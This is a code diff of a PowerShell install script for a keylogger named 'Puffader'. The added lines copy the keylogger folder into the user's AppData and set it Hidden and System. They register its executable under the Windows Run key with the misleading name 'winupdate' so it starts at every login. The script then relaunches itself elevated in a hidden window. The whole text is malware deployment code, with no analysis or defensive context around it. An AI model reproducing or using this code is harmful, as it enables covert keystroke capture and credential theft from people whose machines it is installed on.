@@ -1,11 +1,23 @@
 # NOTE: If text files are associated with something other than notepad, this will override it.
-# You will also need to compile file as .exe
+# You will also need to compile keylogger as .exe
 
 # Set the compiled folder name
 $strFileDir = "Puffader"
 
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
+    $APPDATA = "$env:APPDATA"
+    Copy-Item -Path $strFileDir -Destination $APPDATA -Recurse -Force
+    $(Get-Item $APPDATA\$strFileDir).Attributes = ‘Hidden, System’
+
+    Get-ChildItem -Filter *.exe $APPDATA\$strFileDir | ForEach {
+    If (Compare-Object $_.Name "w9xpopen.exe") {
+    $strFilePath = $_.FullName
+    }
+
+    New-ItemProperty -path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force
+}
+
     Start-Process powershell.exe -Verb RunAs -ArgumentList ('-WindowStyle Hidden -noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
     exit
 }
